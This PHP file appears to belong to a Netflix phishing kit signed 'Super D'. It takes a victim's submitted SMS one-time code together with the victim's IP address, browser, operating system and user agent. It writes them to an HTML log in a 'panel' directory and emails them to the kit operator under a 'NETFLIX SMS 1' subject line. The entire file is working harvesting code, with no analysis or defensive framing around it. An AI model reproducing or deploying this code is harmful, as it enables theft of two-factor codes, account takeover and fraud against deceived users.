<?php
/*
SUPER D
*/
@ini_set('display_errors', 'on');
if(isset($_POST['otp1'])){session_start(); 
require 'detect.php';
include "../../config.php";
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$otp1 = $_POST['otp1'];$useragent = $_SERVER['HTTP_USER_AGENT'];$ecran = $_SESSION['computer'];$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
$msg = '
[+]━━━━━━━━━━━━━━━━【💖NETFLIX💖】━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【👤 SMS INFO]━━━━━━━━━━━━━━[+]
[👤 CODE ] = '.$otp1.'
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🖖 FINGERPRINT] = '.$useragent.'
[+]━━━━━━━━━━━━━━━━【💖NETFLIX💖】━━━━━━━━━━━━━━━[+]
';
$msght = '<tr>
<td width="80">
<p align="center"><img src="'.$_SESSION['ip_countryCode'].'">   ' .$IP.'</td>
<td width="30">
<p align="center">SMS 1</td>
<td width="40">
<p align="center">'.$otp1.'</td>
<td width="40">
<p align="center">'.$times.' / '.$date.'</td>
</font></td></tr>';
$save=fopen("../panel/otp".$namerand.".html", "a+");fwrite($save,$msght);fclose($save);
$subject  = " [ NETFLIX SMS 1 ] / ".$IP." / Super 'D' ";$headers = "From: NETFLIX \r\n";mail($yourmail, $subject, $msg, $headers);
}
?>